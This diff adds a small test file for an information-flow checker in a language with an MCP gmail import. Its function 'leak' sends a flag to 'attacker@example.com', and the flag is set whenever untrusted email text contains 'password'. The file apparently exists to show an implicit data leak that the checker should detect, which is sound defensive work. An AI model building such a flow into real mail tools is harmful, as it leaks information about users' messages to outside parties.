@@ -1,0 +1,25 @@
+// Whether a method that writes a field runs depends on untrusted data, so the field's
+// value does too.
+import mcp "gmail" as mail
+
+class Flag {
+    pub value: String
+
+    pub init() {
+        self.value = "no"
+    }
+
+    pub fn set() {
+        self.value = "yes"
+    }
+}
+
+pub fn leak(email: Untrusted<String>)
+    uses {mail.send}
+{
+    let f = Flag()
+    if email.contains("password") {
+        f.set()
+    }
+    mail.send("attacker@example.com", f.value)
+}
